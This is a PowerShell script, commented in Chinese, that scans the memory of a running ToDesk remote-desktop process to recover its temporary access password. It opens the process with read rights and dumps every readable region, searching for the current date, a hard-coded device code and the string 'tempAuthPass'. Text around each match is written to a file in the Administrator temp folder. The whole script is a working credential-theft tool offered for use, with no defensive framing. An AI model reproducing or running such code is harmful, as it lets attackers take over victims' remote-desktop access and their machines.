# ToDesk 临时密码定点扫描：按 FindToDeskPass 的思路找「日期串 + 设备代码 + 上方 224 字节的密码」
param(
    [int]$TargetPid = 0,
    [string]$OutFile = "C:\Users\Administrator\AppData\Local\Temp\todesk_find.txt",
    [int]$Window = 512
)

$ErrorActionPreference = "Stop"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class MemScan2 {
    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(int access, bool inherit, int pid);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, int size, out IntPtr read);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern int VirtualQueryEx(IntPtr h, IntPtr addr, out MEMORY_BASIC_INFORMATION mbi, int len);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr h);
}
"@

if ($TargetPid -eq 0) {
    $cand = Get-Process ToDesk -ErrorAction SilentlyContinue |
        Where-Object { $_.SessionId -ne 0 } |
        Sort-Object WorkingSet64 -Descending |
        Select-Object -First 1

    if ($null -eq $cand) {
        throw "找不到控制台会话里的 ToDesk.exe 进程"
    }

    $TargetPid = $cand.Id
}

$PROCESS_VM_READ = 0x10
$PROCESS_QUERY_INFORMATION = 0x400
$MEM_COMMIT = 0x1000
$READABLE = @(0x02, 0x04, 0x08, 0x20, 0x40, 0x80)

$h = [MemScan2]::OpenProcess($PROCESS_VM_READ -bor $PROCESS_QUERY_INFORMATION, $false, $TargetPid)

if ($h -eq [IntPtr]::Zero) {
    throw "OpenProcess 失败，错误码 $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}

$today = Get-Date -Format "yyyyMMdd"
$patterns = @($today, "827428815", "tempAuthPass")

$lines = New-Object System.Collections.Generic.List[string]
$lines.Add("pid=$TargetPid today=$today window=$Window")

$mbi = New-Object MemScan2+MEMORY_BASIC_INFORMATION
$addr = [IntPtr]::Zero
$chunk = 4MB
$buf = New-Object byte[] $chunk
$regions = 0
$scanned = 0

while ($true) {
    $ret = [MemScan2]::VirtualQueryEx($h, $addr, [ref]$mbi, [Runtime.InteropServices.Marshal]::SizeOf($mbi))

    if ($ret -eq 0) {
        break
    }

    $size = [int64]$mbi.RegionSize
    $base = [int64]$mbi.BaseAddress

    if ($mbi.State -eq $MEM_COMMIT -and $READABLE -contains ([int]$mbi.Protect -band 0xFF)) {
        $regions += 1
        $offset = 0

        while ($offset -lt $size) {
            $want = [int][Math]::Min($chunk, $size - $offset)
            $read = [IntPtr]::Zero
            $ok = [MemScan2]::ReadProcessMemory($h, [IntPtr]($base + $offset), $buf, $want, [ref]$read)

            if ($ok -and $read.ToInt64() -gt 0) {
                $len = [int]$read.ToInt64()
                $scanned += $len
                $text = [Text.Encoding]::ASCII.GetString($buf, 0, $len)

                foreach ($p in $patterns) {
                    $idx = 0

                    while ($true) {
                        $idx = $text.IndexOf($p, $idx, [StringComparison]::Ordinal)

                        if ($idx -lt 0) {
                            break
                        }

                        $abs = $base + $offset + $idx
                        $s = [Math]::Max(0, $idx - $Window)
                        $e = [Math]::Min($len, $idx + $Window)
                        $clean = ($text.Substring($s, $e - $s) -replace '[^\x20-\x7E]', '.')

                        $lines.Add(("PAT[" + $p + "] abs=0x{0:X} ctx=" -f $abs) + $clean)
                        $idx += $p.Length
                    }
                }
            }

            $offset += $chunk
        }
    }

    $next = $base + $size

    if ($next -le $base -or $base -gt 0x7FFFFFFF0000) {
        break
    }

    $addr = [IntPtr]$next
}

[MemScan2]::CloseHandle($h) | Out-Null
$lines.Add("regions=$regions scannedMB=$([math]::Round($scanned / 1MB, 1))")
Set-Content -Path $OutFile -Value $lines -Encoding UTF8
Write-Output "done pid=$TargetPid today=$today regions=$regions scannedMB=$([math]::Round($scanned / 1MB, 1)) out=$OutFile"
